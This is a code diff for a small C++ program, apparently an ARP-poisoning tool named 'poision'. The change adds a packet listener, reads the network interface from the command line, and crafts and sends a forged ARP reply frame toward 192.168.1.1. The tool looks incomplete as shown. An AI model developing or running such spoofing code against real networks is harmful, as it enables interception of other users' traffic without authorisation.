@@ -3,9 +3,27 @@
 
 using namespace std;
 
+class ARPListener : public cyanid::listener {
+public:
+    ARPListener(cyanid::device& dev) : cyanid::listener(dev)
+    {
+    }
+
+protected:
+    void handle_packet(const cyanid::raw_packet& packet)
+    {
+        std::cout << "Got a new packet" << std::endl;
+    }
+};
+
 int main(int argc, char* argv[])
 {
-    const std::string iface = "wlan0";
+    if(argc < 2) {
+        cerr << "Usage: poision INTERFACE" << endl;
+        return 1;
+    }
+
+    const std::string iface = argv[1];
 
     cyanid::device device(iface);
     cyanid::basic_mac_addr* mac_addr = device.get_mac();
@@ -18,18 +36,21 @@ int main(int argc, char* argv[])
          << "MAC addr:        " << source_mac << endl
          << "IP addr:         " << source_ip << endl;
 
+    ARPListener listener(device);
+    listener.run();
+
     cyanid::packet packet(device);
 
-    packet.build<cyanid::arp>()(
-            cyanid::arp::REPLY,
+    packet.build<cyanid::builder::arp>()(
+            cyanid::builder::arp::REPLY,
             source_mac,
             source_ip,
             "00:00:00:00:00:00",
             "192.168.1.1");
 
-    packet.build<cyanid::ethernet>()(
+    packet.build<cyanid::builder::ethernet>()(
             "00:00:00:00:00:00",
-            cyanid::arp::ETHER_TYPE);
+            cyanid::builder::arp::ETHER_TYPE);
 
     size_t bytes_written = packet.dispatch();
     cout << "Wrote " << bytes_written << " bytes to the network" << endl;
